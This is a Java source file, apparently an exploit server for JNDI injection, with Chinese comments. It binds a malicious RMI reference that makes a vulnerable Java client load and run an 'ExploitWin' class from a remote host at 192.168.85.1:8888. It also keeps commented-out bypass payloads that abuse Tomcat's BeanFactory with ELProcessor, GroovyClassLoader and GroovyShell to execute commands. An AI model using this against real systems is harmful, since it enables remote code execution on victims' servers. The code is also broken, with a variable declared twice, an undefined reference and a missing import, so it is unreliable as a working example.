//Ref: https://www.veracode.com/blog/research/exploiting-jndi-injections-java
  
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.StringRefAddr;
import org.apache.naming.ResourceRef;

public class NormalRMIServer {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1097);
        // 绕过方式的payload之javax.el.ELProcessor（适用于Tomcat）
//        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
//        resourceRef.add(new StringRefAddr("forceString", "x=eval"));
//        resourceRef.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"calc\")"));

      
//    // 绕过方式的payload之groovy.lang.GroovyClassLoader（适用于Groovy 2.x）
//    ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
//        ref.add(new StringRefAddr("forceString", "x=parseClass"));
//    String script = String.format("@groovy.transform.ASTTest(value={\n" +
//                    "    assert java.lang.Runtime.getRuntime().exec(\"%s\")\n" +
//                    "})\n" +
//                    "def x\n",
//            "calc"
//    );
//    ref.add(new StringRefAddr("x",script));
      
      
        // 绕过方式的payload之groovy.lang.GroovyShell（适用于Groovy 2.x & 1.x）
//        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
//        ref.add(new StringRefAddr("forceString", "x=evaluate"));
//        String script = String.format("'%s'.execute()", "calc"); //commandGenerator.getBase64CommandTpl());
//        ref.add(new StringRefAddr("x",script));
      

        // 普通方式的payload
        Reference ref = new Reference("whatever", "ExploitWin","http://192.168.85.1:8888/");
        
        // 普通方式的payload之二
        ResourceRef ref = new ResourceRef("whatever", null, "", "", true,"ExploitWin","http://192.168.85.1:8888/");
        
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("EvalObj", referenceWrapper);
        System.out.println("the Server is bind rmi://127.0.0.1:1097/EvalObj");
    }
}
